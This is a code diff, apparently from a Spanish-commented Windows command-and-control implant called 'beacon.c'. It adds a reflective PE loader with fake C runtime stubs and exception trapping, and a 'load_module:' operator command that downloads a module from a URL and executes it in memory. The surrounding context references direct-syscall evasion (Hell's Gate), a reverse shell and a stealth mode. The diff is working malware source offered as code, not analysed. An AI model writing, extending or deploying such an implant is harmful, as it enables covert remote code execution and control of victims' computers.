@@ -187,7 +187,6 @@ cat > beacon.c << EOF
 #include <windows.h>
 #include <winnt.h>
 #include <winhttp.h>
-
 #include <wincrypt.h>
 #include <ntstatus.h>
 #include <tlhelp32.h>
@@ -204,6 +203,7 @@ cat > beacon.c << EOF
 #include <objbase.h>
 #include <shellapi.h>
 #include <winioctl.h>
+#include <setjmp.h>
 
 #include "aes.h"
 #include "cJSON.h"
@@ -361,6 +361,114 @@ const char* aes_key_hex = "$AES_KEY";
 
 BYTE aes_key[32];
 
+// Stub para __iob_func
+// === STUBS CRT ===
+static int _fake_locks[32];
+// === STUB CRT MEJORADO PARA __iob_func ===
+FILE _fake_iob[3];
+
+__declspec(noinline) FILE* __cdecl stub___iob_func(void) {
+    static int inited = 0;
+    if (!inited) {
+        // Inicializa stdin (0)
+        _fake_iob[0]._file = 0;
+        _fake_iob[0]._flag = 0x0080; // _IOREAD
+
+        // Inicializa stdout (1) - ¡CRÍTICO PARA vfprintf!
+        _fake_iob[1]._file = 1;
+        _fake_iob[1]._flag = 0x0040; // _IOWRT
+        _fake_iob[1]._base = (char*)1; // Dirección no nula para evitar crash
+        _fake_iob[1]._ptr = (char*)1;
+        _fake_iob[1]._cnt = 0;
+
+        // Inicializa stderr (2)
+        _fake_iob[2]._file = 2;
+        _fake_iob[2]._flag = 0x0040; // _IOWRT
+        _fake_iob[2]._base = (char*)1;
+        _fake_iob[2]._ptr = (char*)1;
+        _fake_iob[2]._cnt = 0;
+
+        inited = 1;
+    }
+    return _fake_iob;
+}
+
+void __cdecl stub__lock(int locknum) {
+    // Simulamos un lock básico (sin real critical section)
+    // Podrías usar InterlockedExchange si quieres simular bloqueo
+    // Pero para evitar crashes, simplemente no hagas nada o simula
+    if (locknum >= 0 && locknum < 32) {
+        // Marca como "ocupado" (muy básico)
+        volatile int* lock = &_fake_locks[locknum];
+        // No podemos usar EnterCriticalSection, pero evitamos que el CRT crashee
+        // Simplemente no hagas nada → mejor que crash
+    }
+    return;
+}
+
+void __cdecl stub__unlock(int locknum) {
+    if (locknum >= 0 && locknum < 32) {
+        volatile int* lock = &_fake_locks[locknum];
+        // Simulamos liberación
+    }
+    return;
+}
+
+int __cdecl stub__dup2(int oldfd, int newfd) {
+    // Simplemente devuelve newfd (comportamiento básico)
+    return newfd;
+}
+
+int __cdecl stub__setmaxstdio(int newmax) {
+    return 512; // valor por defecto
+}
+
+// 2. _amsg_exit: evita popup de error del CRT
+void __cdecl stub__amsg_exit(int) {
+    return;
+}
+
+// 3. _initterm: inicializa constructores C++
+
+void __cdecl stub__initterm(_PVFV* first, _PVFV* last) {
+    // Recorremos los constructores globales, pero sin SEH
+    // Si hay un crash, que el VEH lo maneje, no aquí
+    while (first < last) {
+        if (*first != NULL) {
+            (*first)();
+        }
+        first++;
+    }
+}
+// 4. abort: evita salida abrupta
+void __cdecl stub_abort(void) {
+    return; // o ExitProcess(1) si prefieres
+}
+
+// 5. calloc: asigna memoria y la llena con ceros
+void* __cdecl stub_calloc(size_t num, size_t size) {
+    size_t total = num * size;
+    void* mem = VirtualAlloc(NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (mem) memset(mem, 0, total);
+    return mem;
+}
+
+// 6. free: libera memoria
+void __cdecl stub_free(void* ptr) {
+    if (ptr) VirtualFree(ptr, 0, MEM_RELEASE);
+}
+
+// 7. realloc: redimensiona memoria
+void* __cdecl stub_realloc(void* ptr, size_t size) {
+    if (!ptr) return stub_calloc(1, size);
+    void* new_ptr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (new_ptr && size > 0) {
+        // No conocemos el tamaño original, pero copiamos hasta `size`
+        memcpy(new_ptr, ptr, size);
+        VirtualFree(ptr, 0, MEM_RELEASE);
+    }
+    return new_ptr;
+}
 
 // User-Agents (como en tu Go)
 const char* USER_AGENTS[] = {
@@ -390,6 +498,14 @@ const char* TRAFFIC_UAS[] = {
 // =================================================================================================
 // NTAPI Definitions
 // =================================================================================================
+static jmp_buf exceptionJump;
+static LONG WINAPI ExceptionFilter(EXCEPTION_POINTERS *ExceptionInfo) {
+    // Si es una violación de acceso
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+        longjmp(exceptionJump, 1);
+    }
+    return EXCEPTION_EXECUTE_HANDLER;
+}
 
 // === ESTRUCTURAS NECESARIAS (MinGW-safe) ===
 typedef struct _UNICODE_STRING {
@@ -479,6 +595,7 @@ typedef struct {
     BOOL open;
 } PortResult;
 
+
 // Variables globales
 int stealthModeEnabled = 0;  
 int iamgroot = 0;
@@ -534,6 +651,10 @@ unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize);
 BOOL is_64bit(BYTE* buffer);
 BOOL FileExistsA(const char* filePath);
 
+void __cdecl stub_abort(void);
+void* __cdecl stub_calloc(size_t, size_t);
+void __cdecl stub_free(void*);
+void* __cdecl stub_realloc(void*, size_t);
 void __cdecl ReverseShell(void* arg);
 void cleanupProxy();
 // === HELL'S GATE + HELLDESCENT ===
@@ -570,6 +691,238 @@ NTSTATUS HellDescent(
         :
         : "rax", "r10", "rcx"
     );
+}
+
+// === Carga un módulo en memoria ===
+PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileBuffer + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
+    PVOID baseAddress = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!baseAddress) return NULL;
+
+    // Copiar cabeceras
+    memcpy(baseAddress, fileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
+
+    // Copiar secciones
+    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
+    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        if (sections[i].PointerToRawData && sections[i].SizeOfRawData) {
+            memcpy((BYTE*)baseAddress + sections[i].VirtualAddress, fileBuffer + sections[i].PointerToRawData, sections[i].SizeOfRawData);
+        }
+    }
+
+    // Ajustar ImageBase
+    DWORD_PTR delta = (DWORD_PTR)baseAddress - ntHeaders->OptionalHeader.ImageBase;
+    if (delta != 0) {
+        // Reubicación
+        IMAGE_DATA_DIRECTORY* relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        if (relocDir->Size > 0) {
+            BYTE* reloc = (BYTE*)baseAddress + relocDir->VirtualAddress;
+            while (reloc < (BYTE*)baseAddress + relocDir->VirtualAddress + relocDir->Size) {
+                IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)reloc;
+                if (block->SizeOfBlock == 0) break;
+                WORD* entry = (WORD*)(block + 1);
+                for (DWORD i = 0; i < (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; i++) {
+                    if ((entry[i] & 0xF000) == 0x3000) {
+                        DWORD_PTR* patchAddr = (DWORD_PTR*)((BYTE*)baseAddress + block->VirtualAddress + (entry[i] & 0x0FFF));
+                        *patchAddr += delta;
+                    }
+                }
+                reloc += block->SizeOfBlock;
+            }
+        }
+    }
+
+    // Resolver IAT
+    IMAGE_DATA_DIRECTORY* importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir->Size > 0 && importDir->VirtualAddress > 0) {
+        IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)baseAddress + importDir->VirtualAddress);
+
+        for (; importDesc->Name; importDesc++) {
+            char* dllName = (char*)((BYTE*)baseAddress + importDesc->Name);
+            printf("[*] Cargando DLL de importación: %s\n", dllName);
+            fflush(stdout);
+
+            HMODULE hDll = LoadLibraryA(dllName);
+            if (!hDll) {
+                printf("[-] No se pudo cargar: %s\n", dllName);
+                fflush(stdout);
+                VirtualFree(baseAddress, 0, MEM_RELEASE);
+                return NULL;
+            }
+
+            IMAGE_THUNK_DATA* origThunk = (IMAGE_THUNK_DATA*)((BYTE*)baseAddress + importDesc->OriginalFirstThunk);
+            IMAGE_THUNK_DATA* firstThunk = (IMAGE_THUNK_DATA*)((BYTE*)baseAddress + importDesc->FirstThunk);
+
+            if (!origThunk || !firstThunk) continue;
+
+            for (; origThunk->u1.AddressOfData; origThunk++, firstThunk++) {
+                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+                    WORD ordinal = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
+                    printf("[IAT] Resolviendo por ordinal: %s!%hu\n", dllName, ordinal);
+                    fflush(stdout);
+                    firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, MAKEINTRESOURCEA(ordinal));
+                } else {
+                    IMAGE_IMPORT_BY_NAME* import = (IMAGE_IMPORT_BY_NAME*)((BYTE*)baseAddress + origThunk->u1.AddressOfData);
+                    char* funcName = (char*)import->Name;
+                    printf("[IAT] Resolviendo: %s!%s\n", dllName, funcName);
+                    fflush(stdout);
+
+                    if (strcmp(funcName, "__iob_func") == 0) {
+                        printf("[IAT] Usando stub para __iob_func\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub___iob_func;
+                    }
+                    else if (strcmp(funcName, "_amsg_exit") == 0) {
+                        printf("[IAT] Usando stub para _amsg_exit\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub__amsg_exit;
+                    }
+                    else if (strcmp(funcName, "_initterm") == 0) {
+                        printf("[IAT] Usando stub para _initterm\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub__initterm;
+                    }
+                    else if (strcmp(funcName, "abort") == 0) {
+                        printf("[IAT] Usando stub para abort\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub_abort;
+                    }
+                    else if (strcmp(funcName, "calloc") == 0) {
+                        printf("[IAT] Usando stub para calloc\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub_calloc;
+                    }
+                    else if (strcmp(funcName, "free") == 0) {
+                        printf("[IAT] Usando stub para free\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub_free;
+                    }
+                    else if (strcmp(funcName, "realloc") == 0) {
+                        printf("[IAT] Usando stub para realloc\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub_realloc;
+                    }
+                    else if (strcmp(funcName, "_dup2") == 0) {
+                        printf("[IAT] Usando stub para _dup2\n");
+                        fflush(stdout);
+                        firstThunk->u1.Function = (ULONG_PTR)stub__dup2;
+                    }
+                    else if (strcmp(funcName, "_setmaxstdio") == 0) {
+                        firstThunk->u1.Function = (ULONG_PTR)stub__setmaxstdio;
+                    }
+                    else {
+                        firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, funcName);
+                    }               
+                }
+
+                if (!firstThunk->u1.Function) {
+                    printf("[-] ADVERTENCIA: No se resolvió: %s!%p\n", dllName, (void*)origThunk->u1.AddressOfData);
+                    fflush(stdout);
+                    // No retornes NULL aquí — algunas funciones pueden no existir
+                }
+            }
+        }
+    } else {
+        printf("[!] No hay IAT o está vacía\n");
+        fflush(stdout);
+    }
+
+    return baseAddress;
+}
+
+// === Ejecuta el módulo (DllMain o EntryPoint) ===
+BOOL ExecuteModule(PVOID moduleBase) {
+    // Registrar manejador de excepciones
+    PVOID vectoredHandler = AddVectoredExceptionHandler(1, ExceptionFilter);
+    if (!vectoredHandler) {
+        printf("[-] No se pudo registrar el manejador de excepciones\n");
+        return FALSE;
+    }
+
+    BOOL result = FALSE;
+
+    if (setjmp(exceptionJump) == 0) {
+        // Bloque protegido
+        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
+        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);
+
+        if (ntHeaders->OptionalHeader.AddressOfEntryPoint == 0) {
+            result = TRUE;
+            goto cleanup;
+        }
+
+        PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+
+        if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
+            printf("[*] Llamando a DllMain en: 0x%p\n", entryPoint);
+            fflush(stdout);
+
+            typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
+            DllMain_t DllMain = (DllMain_t)entryPoint;
+
+            // DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL);
+
+            typedef BOOL (WINAPI *DllMainCRTStartup_t)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
+            DllMainCRTStartup_t DllMainCRTStartup = (DllMainCRTStartup_t)entryPoint;
+
+            DllMainCRTStartup((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL);
+        } else {
+            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+            if (hThread) {
+                CloseHandle(hThread);
+                result = TRUE;
+            } else {
+                result = FALSE;
+                goto cleanup;
+            }
+        }
+        result = TRUE;
+    } else {
+        // Se capturó una EXCEPCIÓN (ej: acceso inválido)
+        printf("[-] Excepción capturada: acceso inválido durante ejecución del módulo\n");
+        result = FALSE;
+    }
+
+cleanup:
+    RemoveVectoredExceptionHandler(vectoredHandler);
+    return result;
+}
+
+// === Carga y ejecuta un módulo desde URL ===
+BOOL LoadModuleFromURL(const char* url) {
+    printf("[*] Cargando módulo desde: %s\n", url);
+    fflush(stdout);
+
+    DWORD fileSize = 0;
+    unsigned char* fileBuffer = DownloadToBuffer(url, &fileSize);
+    if (!fileBuffer || fileSize == 0) {
+        printf("[-] Fallo al descargar módulo\n");
+        return FALSE;
+    }
+
+    PVOID moduleBase = MapModuleToMemory(fileBuffer, fileSize);
+    free(fileBuffer);
+
+    if (!moduleBase) {
+        printf("[-] Fallo al mapear módulo en memoria\n");
+        return FALSE;
+    }
+
+    printf("[+] Módulo cargado en: 0x%p\n", moduleBase);
+    if (ExecuteModule(moduleBase)) {
+        printf("[+] Módulo ejecutado.\n");
+        return TRUE;
+    } else {
+        printf("[-] Fallo al ejecutar módulo.\n");
+        VirtualFree(moduleBase, 0, MEM_RELEASE);
+        return FALSE;
+    }
 }
 
 // === XOR ===
@@ -4616,6 +4969,13 @@ void handleAdversary(char* command) {
         } else {
             snprintf(output, sizeof(output), "No useful software found");
         }
+        goto send_response;
+    }
+
+    if (strncmp(command, "load_module:", 12) == 0) {
+        char* url = command + 12;
+        LoadModuleFromURL(url);
+        snprintf(output, sizeof(output), "Módulo cargado: %s", url);
         goto send_response;
     }
 
